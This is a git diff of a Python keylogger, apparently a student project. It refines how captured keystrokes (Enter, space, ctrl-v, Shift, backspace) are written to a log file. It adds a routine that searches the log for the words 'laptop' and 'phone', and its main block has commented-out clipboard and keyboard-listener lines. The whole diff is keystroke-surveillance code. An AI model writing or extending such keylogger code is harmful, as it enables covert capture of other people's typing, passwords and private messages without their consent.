@@ -38,24 +38,36 @@ def keyPressed(key):
                 elif char == b'\x16':
                     logKey.write("<ctrl-v>")
 
+
         except Exception as ex:
             # print(ex)
             if str(key) == "Key.enter":
                 logKey.write("\n" + " "*29)
             elif str(key) == "Key.space":
                 logKey.write(" ")
-            elif str(key) == "Key.shift":
-                logKey.write("")
             # elif str(key) == "Key.print_screen":
             #     logKey.write("")
             elif "Key.ctrl_" in str(key):
                  pass
+            elif "Key.shift" in str(key):
+                 pass
+
             # elif str(key) == "Key.backspace":
-                # logKey.seek(logKey.tell()-1)
-                # logKey.write(" ")
-                # logKey.seek(logKey.tell()-1)
+            #         if logKey.tell() > 0:
+            #             logKey.seek(logKey.tell() - 1)
+            #             logKey.truncate()
             else:
                  logKey.write(f"<{str(key)}>")
+    # string to search in file
+    words = ['laptop', 'phone']
+    with open(r"C:\Users\USER\PycharmProjects\fyp\keyfile.txt", 'r') as logKey:
+        content = logKey.read()
+    # Iterate list to find each word
+    for word in words:
+        if word in content:
+            print('string exist in a file')
+        else:
+            break
 
 
 if __name__ == "__main__":
@@ -67,4 +79,4 @@ if __name__ == "__main__":
     # print(clipboard_contents)
     # listener = keyboard.Listener(on_press=keyPressed)
     # listener.start()
-    input()
+    # input()
